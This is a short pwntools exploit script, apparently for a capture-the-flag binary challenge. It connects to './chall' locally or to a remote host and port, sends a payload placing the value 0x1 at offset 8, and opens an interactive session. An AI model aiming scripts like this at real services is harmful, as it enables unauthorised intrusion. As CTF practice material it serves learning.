from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


exe = "./chall"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"

io = start()
offset = 8

payload = flat({offset: (0x1)})

io.sendline(payload)
io.interactive()